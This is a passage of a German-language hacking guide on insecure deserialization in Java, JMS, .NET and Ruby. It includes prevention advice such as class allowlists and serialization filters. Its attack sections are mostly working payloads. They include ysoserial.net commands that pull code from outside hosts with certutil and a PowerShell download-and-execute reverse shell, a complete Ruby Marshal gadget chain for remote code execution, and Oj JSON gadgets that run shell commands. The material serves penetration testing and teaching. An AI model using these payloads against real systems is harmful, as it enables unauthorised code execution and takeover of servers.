open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Du kannst **verwenden** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **neben ysoserial, um mehr Exploits zu erstellen**. Weitere Informationen zu diesem Tool findest du in den **Folien des Vortrags**, in dem das Tool vorgestellt wurde: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)kann verwendet werden, um Payloads zu generieren, um verschiedene **Json**- und **Yml**-Serialisierungsbibliotheken in Java auszunutzen.\
Um das Projekt zu kompilieren, musste ich diese **Abh√§ngigkeiten** zu `pom.xml` hinzuf√ºgen:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Installiere Maven** und **kompiliere** das Projekt:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Erfahren Sie mehr √ºber diese Java JSON-Bibliothek: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* Wenn Sie einige ysoserial-Payloads testen m√∂chten, k√∂nnen Sie **diese Webanwendung ausf√ºhren**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Warum

Java verwendet viel Serialisierung f√ºr verschiedene Zwecke wie:

* **HTTP-Anfragen**: Serialisierung wird h√§ufig im Management von Parametern, ViewState, Cookies usw. eingesetzt.
* **RMI (Remote Method Invocation)**: Das Java RMI-Protokoll, das vollst√§ndig auf Serialisierung basiert, ist ein Grundpfeiler f√ºr die Fernkommunikation in Java-Anwendungen.
* **RMI √ºber HTTP**: Diese Methode wird h√§ufig von Java-basierten dicken Client-Webanwendungen verwendet, die Serialisierung f√ºr alle Objektkommunikationen nutzen.
* **JMX (Java Management Extensions)**: JMX verwendet Serialisierung zum √úbertragen von Objekten √ºber das Netzwerk.
* **Benutzerdefinierte Protokolle**: In Java besteht die Standardpraxis darin, rohe Java-Objekte zu √ºbertragen, was in den kommenden Exploit-Beispielen demonstriert wird.

### Pr√§vention

#### Transiente Objekte

Eine Klasse, die `Serializable` implementiert, kann jedes Objekt innerhalb der Klasse als `transient` kennzeichnen, das nicht serialisierbar sein sollte. Zum Beispiel:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Vermeiden Sie die Serialisierung einer Klasse, die `Serializable` implementieren muss

In Szenarien, in denen bestimmte **Objekte das `Serializable`**-Interface aufgrund der Klassenhierarchie implementieren m√ºssen, besteht das Risiko einer unbeabsichtigten Deserialisierung. Um dies zu verhindern, stellen Sie sicher, dass diese Objekte nicht deserialisierbar sind, indem Sie eine `final` `readObject()`-Methode definieren, die konsequent eine Ausnahme ausl√∂st, wie unten gezeigt:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Verbesserung der Deserialisierungs-Sicherheit in Java**

**Anpassung von `java.io.ObjectInputStream`** ist ein praktischer Ansatz zur Sicherung von Deserialisierungsprozessen. Diese Methode ist geeignet, wenn:

* Der Deserialisierungscode unter Ihrer Kontrolle steht.
* Die Klassen, die f√ºr die Deserialisierung erwartet werden, bekannt sind.

√úberschreiben Sie die **`resolveClass()`**-Methode, um die Deserialisierung nur auf erlaubte Klassen zu beschr√§nken. Dies verhindert die Deserialisierung von Klassen, die nicht ausdr√ºcklich erlaubt sind, wie im folgenden Beispiel, das die Deserialisierung nur auf die Klasse `Bicycle` beschr√§nkt:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Verwendung eines Java-Agenten zur Sicherheitsverbesserung** bietet eine R√ºckfalll√∂sung, wenn eine Code√§nderung nicht m√∂glich ist. Diese Methode gilt haupts√§chlich f√ºr **das Blacklisting sch√§dlicher Klassen**, unter Verwendung eines JVM-Parameters:
```
-javaagent:name-of-agent.jar
```
Es bietet eine M√∂glichkeit, die Deserialisierung dynamisch zu sichern, ideal f√ºr Umgebungen, in denen sofortige Code√§nderungen unpraktisch sind.

√úberpr√ºfen Sie ein Beispiel in [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementierung von Serialisierungsfiltern**: Java 9 f√ºhrte Serialisierungsfilter √ºber das **`ObjectInputFilter`**-Interface ein, das einen leistungsstarken Mechanismus zum Festlegen von Kriterien bietet, die serialisierte Objekte erf√ºllen m√ºssen, bevor sie deserialisiert werden. Diese Filter k√∂nnen global oder pro Stream angewendet werden und bieten eine granulare Kontrolle √ºber den Deserialisierungsprozess.

Um Serialisierungsfilter zu nutzen, k√∂nnen Sie einen globalen Filter festlegen, der auf alle Deserialisierungsoperationen angewendet wird, oder ihn dynamisch f√ºr bestimmte Streams konfigurieren. Zum Beispiel:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Nutzung externer Bibliotheken zur Verbesserung der Sicherheit**: Bibliotheken wie **NotSoSerial**, **jdeserialize** und **Kryo** bieten erweiterte Funktionen zur Kontrolle und √úberwachung der Java-Deserialisierung. Diese Bibliotheken k√∂nnen zus√§tzliche Sicherheitsebenen bereitstellen, wie z.B. das Whitelisting oder Blacklisting von Klassen, die Analyse von serialisierten Objekten vor der Deserialisierung und die Implementierung benutzerdefinierter Serialisierungsstrategien.

* **NotSoSerial** unterbricht Deserialisierungsprozesse, um die Ausf√ºhrung von nicht vertrauensw√ºrdigem Code zu verhindern.
* **jdeserialize** erm√∂glicht die Analyse von serialisierten Java-Objekten, ohne sie zu deserialisieren, und hilft dabei, potenziell sch√§dliche Inhalte zu identifizieren.
* **Kryo** ist ein alternatives Serialisierungsframework, das Geschwindigkeit und Effizienz betont und konfigurierbare Serialisierungsstrategien bietet, die die Sicherheit verbessern k√∂nnen.

### Referenzen

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Deserialisierung und ysoserial Vortrag: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Vortrag √ºber gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) und Folien: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec-Papier: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java und .Net JSON Deserialisierung **Papier:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** Vortrag: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) und Folien: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* Deserialisierungs-CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI-Injection & log4Shell

Finde heraus, was **JNDI-Injection ist, wie man es √ºber RMI, CORBA & LDAP missbraucht und wie man log4shell ausnutzt** (und ein Beispiel f√ºr diese Schwachstelle) auf der folgenden Seite:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> Die **Java Message Service** (**JMS**) API ist eine Java-nachrichtenorientierte Middleware-API zum Senden von Nachrichten zwischen zwei oder mehr Clients. Es ist eine Implementierung zur L√∂sung des Produzenten-Verbraucher-Problems. JMS ist Teil der Java Platform, Enterprise Edition (Java EE), und wurde durch eine Spezifikation definiert, die bei Sun Microsystems entwickelt wurde, aber seitdem vom Java Community Process geleitet wird. Es ist ein Messaging-Standard, der es Anwendungsmodulen, die auf Java EE basieren, erm√∂glicht, Nachrichten zu erstellen, zu senden, zu empfangen und zu lesen. Es erm√∂glicht die Kommunikation zwischen verschiedenen Komponenten einer verteilten Anwendung, die lose gekoppelt, zuverl√§ssig und asynchron ist. (Von [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Produkte

Es gibt mehrere Produkte, die diese Middleware verwenden, um Nachrichten zu senden:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### Ausnutzung

Im Grunde gibt es eine **Menge von Diensten, die JMS auf gef√§hrliche Weise verwenden**. Daher, wenn du **genug Berechtigungen** hast, um Nachrichten an diese Dienste zu senden (normalerweise ben√∂tigst du g√ºltige Anmeldeinformationen), k√∂nntest du in der Lage sein, **b√∂sartige Objekte zu senden, die serialisiert sind und vom Verbraucher/Abonnenten deserialisiert werden**.\
Das bedeutet, dass bei dieser Ausnutzung alle **Clients, die diese Nachricht verwenden, infiziert werden**.

Du solltest daran denken, dass selbst wenn ein Dienst anf√§llig ist (weil er Benutzereingaben unsicher deserialisiert), du immer noch g√ºltige Gadgets finden musst, um die Schwachstelle auszunutzen.

Das Tool [JMET](https://github.com/matthiaskaiser/jmet) wurde entwickelt, um **diese Dienste zu verbinden und anzugreifen, indem mehrere b√∂sartige Objekte gesendet werden, die mit bekannten Gadgets serialisiert sind**. Diese Exploits funktionieren, wenn der Dienst weiterhin anf√§llig ist und wenn eines der verwendeten Gadgets in der anf√§lligen Anwendung enthalten ist.

### Referenzen

* JMET Vortrag: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Folien: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

Im Kontext von .Net funktionieren Deserialisierungs-Exploits √§hnlich wie die in Java, wobei Gadgets ausgenutzt werden, um spezifischen Code w√§hrend der Deserialisierung eines Objekts auszuf√ºhren.

### Fingerabdruck

#### WhiteBox

Der Quellcode sollte auf Vorkommen von:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Untersucht werden. Der Fokus sollte auf Serialisierern liegen, die es erm√∂glichen, den Typ durch eine Variable unter Benutzerkontrolle zu bestimmen.

#### BlackBox

Die Suche sollte auf die Base64-codierte Zeichenfolge **AAEAAAD/////** oder ein √§hnliches Muster abzielen, das auf der Serverseite deserialisiert werden k√∂nnte, wodurch die Kontrolle √ºber den zu deserialisierenden Typ gew√§hrt wird. Dies k√∂nnte, ist aber nicht beschr√§nkt auf, **JSON** oder **XML**-Strukturen mit `TypeObject` oder `$type`.

### ysoserial.net

In diesem Fall kannst du das Tool [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) verwenden, um **die Deserialisierungs-Exploits zu erstellen**. Nachdem du das Git-Repository heruntergeladen hast, solltest du **das Tool kompilieren**, zum Beispiel mit Visual Studio.

Wenn du lernen m√∂chtest, **wie ysoserial.net seinen Exploit erstellt**, kannst du [**diese Seite √ºberpr√ºfen, auf der das ObjectDataProvider-Gadget + ExpandedWrapper + Json.Net-Formatter erkl√§rt wird**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Die Hauptoptionen von **ysoserial.net** sind: **`--gadget`**, **`--formatter`**, **`--output`** und **`--plugin`.**

* **`--gadget`** wird verwendet, um das Gadget anzugeben, das ausgenutzt werden soll (gib die Klasse/Funktion an, die w√§hrend der Deserialisierung missbraucht wird, um Befehle auszuf√ºhren).
* **`--formatter`**, wird verwendet, um die Methode anzugeben, um den Exploit zu serialisieren (du musst wissen, welche Bibliothek das Backend verwendet, um die Nutzlast zu deserialisieren und dieselbe verwenden, um sie zu serialisieren)
* **`--output`** wird verwendet, um anzugeben, ob du den Exploit in **raw** oder **base64** codiert haben m√∂chtest. _Beachte, dass **ysoserial.net** die Nutzlast mit **UTF-16LE** (Standardkodierung unter Windows) **codiert**, sodass, wenn du die raw-Version erh√§ltst und sie einfach von einer Linux-Konsole aus codierst, du m√∂glicherweise einige **Kodierungs-Kompatibilit√§tsprobleme** hast, die verhindern, dass der Exploit ordnungsgem√§√ü funktioniert (in der HTB JSON-Box funktionierte die Nutzlast sowohl in UTF-16LE als auch in ASCII, aber das bedeutet nicht, dass es immer funktioniert)._
* **`--plugin`** ysoserial.net unterst√ºtzt Plugins, um **Exploits f√ºr spezifische Frameworks** wie ViewState zu erstellen.

#### Weitere ysoserial.net-Parameter

* `--minify` wird eine **kleinere Nutzlast** bereitstellen (wenn m√∂glich)
* `--raf -f Json.Net -c "anything"` Dies wird alle Gadgets angeben, die mit einem bereitgestellten Formatter (`Json.Net` in diesem Fall) verwendet werden k√∂nnen
* `--sf xml` du kannst **ein Gadget** (`-g`) angeben und ysoserial.net wird nach Formatierern suchen, die "xml" enthalten (nicht gro√ügeschrieben)

**ysoserial-Beispiele** zur Erstellung von Exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** hat auch einen **sehr interessanten Parameter**, der hilft, besser zu verstehen, wie jeder Exploit funktioniert: `--test`\
Wenn Sie diesen Parameter angeben, wird **ysoserial.net** den **Exploit lokal versuchen**, sodass Sie testen k√∂nnen, ob Ihr Payload korrekt funktioniert.\
Dieser Parameter ist hilfreich, da Sie, wenn Sie den Code √ºberpr√ºfen, Codeabschnitte wie den folgenden finden werden (aus [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Das bedeutet, dass der Code, um den Exploit zu testen, [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) aufrufen wird.
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
In dem **vorherigen Code ist anf√§llig f√ºr den erstellten Exploit**. Wenn Sie also etwas √Ñhnliches in einer .Net-Anwendung finden, bedeutet das wahrscheinlich, dass diese Anwendung ebenfalls anf√§llig ist.\
Daher erm√∂glicht uns der **`--test`** Parameter zu verstehen, **welche Codeabschnitte anf√§llig sind** f√ºr den Deserialisierungs-Exploit, den **ysoserial.net** erstellen kann.

### ViewState

Werfen Sie einen Blick auf [diesen POST √ºber **wie man versucht, den \_\_ViewState-Parameter von .Net auszunutzen**](exploiting-\_\_viewstate-parameter.md), um **beliebigen Code auszuf√ºhren.** Wenn Sie **bereits die Geheimnisse** kennen, die von der Opfermaschine verwendet werden, [**lesen Sie diesen Beitrag, um zu erfahren, wie man Code ausf√ºhrt**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Prevention

Um die Risiken im Zusammenhang mit der Deserialisierung in .Net zu mindern:

* **Vermeiden Sie es, Datenstr√∂me ihre Objekttypen definieren zu lassen.** Verwenden Sie `DataContractSerializer` oder `XmlSerializer`, wenn m√∂glich.
* **F√ºr `JSON.Net` setzen Sie `TypeNameHandling` auf `None`:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **Vermeiden Sie die Verwendung von `JavaScriptSerializer` mit einem `JavaScriptTypeResolver`.**
* **Begrenzen Sie die Typen, die deserialisiert werden k√∂nnen**, und verstehen Sie die inh√§renten Risiken mit .Net-Typen, wie `System.IO.FileInfo`, die die Eigenschaften von Serverdateien √§ndern k√∂nnen, was potenziell zu Denial-of-Service-Angriffen f√ºhren kann.
* **Seien Sie vorsichtig mit Typen, die riskante Eigenschaften haben**, wie `System.ComponentModel.DataAnnotations.ValidationException` mit seiner `Value`-Eigenschaft, die ausgenutzt werden kann.
* **Steuern Sie die Typinstanziierung sicher**, um zu verhindern, dass Angreifer den Deserialisierungsprozess beeinflussen, wodurch selbst `DataContractSerializer` oder `XmlSerializer` anf√§llig werden.
* **Implementieren Sie Whitelist-Kontrollen** mit einem benutzerdefinierten `SerializationBinder` f√ºr `BinaryFormatter` und `JSON.Net`.
* **Bleiben Sie informiert √ºber bekannte unsichere Deserialisierungs-Gadgets** innerhalb von .Net und stellen Sie sicher, dass Deserialisierer solche Typen nicht instanziieren.
* **Isolieren Sie potenziell riskanten Code** von Code mit Internetzugang, um zu vermeiden, dass bekannte Gadgets, wie `System.Windows.Data.ObjectDataProvider` in WPF-Anwendungen, untrusted Datenquellen ausgesetzt werden.

### **References**

* Java und .Net JSON Deserialisierung **Papier:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** Vortrag: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) und Folien: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

In Ruby wird die Serialisierung durch zwei Methoden innerhalb der **marshal**-Bibliothek erleichtert. Die erste Methode, bekannt als **dump**, wird verwendet, um ein Objekt in einen Byte-Stream zu transformieren. Dieser Prozess wird als Serialisierung bezeichnet. Im Gegensatz dazu wird die zweite Methode, **load**, verwendet, um einen Byte-Stream wieder in ein Objekt zur√ºckzuf√ºhren, ein Prozess, der als Deserialisierung bekannt ist.

Zur Sicherung serialisierter Objekte verwendet **Ruby HMAC (Hash-Based Message Authentication Code)**, um die Integrit√§t und Authentizit√§t der Daten zu gew√§hrleisten. Der f√ºr diesen Zweck verwendete Schl√ºssel wird an einem von mehreren m√∂glichen Orten gespeichert:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Ruby 2.X generische Deserialisierung zu RCE Gadget-Kette (mehr Informationen in** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Andere RCE-Kette zur Ausnutzung von Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() Methode

Wie in [**diesem Sicherheitsbericht**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/) erkl√§rt, wenn einige unsanitisierte Benutzereingaben die `.send()` Methode eines Ruby-Objekts erreichen, erlaubt diese Methode, **jede andere Methode** des Objekts mit beliebigen Parametern aufzurufen.

Zum Beispiel wird das Aufrufen von eval und dann Ruby-Code als zweiten Parameter die Ausf√ºhrung beliebigen Codes erm√∂glichen:

{% code overflow="wrap" %}
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

Dar√ºber hinaus, wenn nur ein Parameter von **`.send()`** von einem Angreifer kontrolliert wird, wie im vorherigen Bericht erw√§hnt, ist es m√∂glich, jede Methode des Objekts aufzurufen, die **keine Argumente ben√∂tigt** oder deren Argumente **Standardwerte** haben.\
Daf√ºr ist es m√∂glich, alle Methoden des Objekts aufzulisten, um **einige interessante Methoden zu finden, die diese Anforderungen erf√ºllen**.

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
{% endcode %}

### Andere Bibliotheken

Diese Technik wurde[ **aus diesem Blogbeitrag**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm\_source=pocket\_shared) entnommen.

Es gibt andere Ruby-Bibliotheken, die verwendet werden k√∂nnen, um Objekte zu serialisieren und die daher missbraucht werden k√∂nnten, um RCE w√§hrend einer unsicheren Deserialisierung zu erlangen. Die folgende Tabelle zeigt einige dieser Bibliotheken und die Methode, die von der geladenen Bibliothek aufgerufen wird, wann immer sie deserialisiert wird (Funktion, die missbraucht werden kann, um RCE zu erhalten):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Bibliothek</strong></td><td><strong>Eingabedaten</strong></td><td><strong>Startmethode innerhalb der Klasse</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Bin√§r</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (Klasse muss als Schl√ºssel in Hash(Map) eingef√ºgt werden)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (Klasse muss als Schl√ºssel in Hash(Map) eingef√ºgt werden)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (Klasse muss als Schl√ºssel in Hash(Map) eingef√ºgt werden)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([siehe Anmerkungen zu json_create am Ende](#table-vulnerable-sinks))</td></tr></tbody></table>

Grundlegendes Beispiel:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
Im Fall des Versuchs, Oj auszunutzen, war es m√∂glich, eine Gadget-Klasse zu finden, die innerhalb ihrer `hash`-Funktion `to_s` aufruft, was spec aufruft, das fetch\_path aufruft, was es erm√∂glichte, eine zuf√§llige URL abzurufen, was einen gro√üartigen Detektor f√ºr diese Art von unsanierten Deserialisierungsanf√§lligkeiten bietet.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport","path": "/", "user": "anyuser", "password": "anypw"
}
```
Dar√ºber hinaus wurde festgestellt, dass mit der vorherigen Technik ein Ordner im System erstellt wird, der eine Voraussetzung ist, um ein anderes Gadget auszunutzen, um dies in ein vollst√§ndiges RCE mit etwas wie:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
√úberpr√ºfen Sie die Details im [**Originalbeitrag**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm\_source=pocket\_shared).

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
